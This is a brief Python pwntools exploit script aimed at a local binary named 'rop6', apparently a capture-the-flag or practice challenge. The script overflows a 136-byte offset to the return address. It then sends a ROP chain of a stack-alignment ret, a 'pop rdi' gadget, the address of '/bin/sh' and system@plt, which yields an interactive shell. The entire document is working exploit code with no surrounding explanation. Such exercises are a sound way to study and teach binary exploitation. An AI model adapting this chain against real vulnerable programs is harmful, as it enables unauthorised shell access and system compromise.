from pwn import *

r=process('./pwn/stack/rop-6/rop6')

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
# gdb.attach(r)


elf=ELF('./pwn/stack/rop-6/rop6')
# Find the offset to the return address
offset = 128 + 8  # 128 bytes for the buffer, 8 bytes for the saved rbp

# Find the gadgets
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(elf.search(b'/bin/sh\x00'))
system = elf.plt['system']
print(hex(pop_rdi),hex(system))
# Construct the ROP chain
rop_chain = [
    ret, # some of the 64 bit libc functions require your stack to be 16-byte aligned, i.e., the address of $rsp ending with 0, when they are called
    pop_rdi, bin_sh,
    system,
]

# Create the payload
payload = b'A' * offset
payload += flat(rop_chain)
r.send(payload)
r.interactive()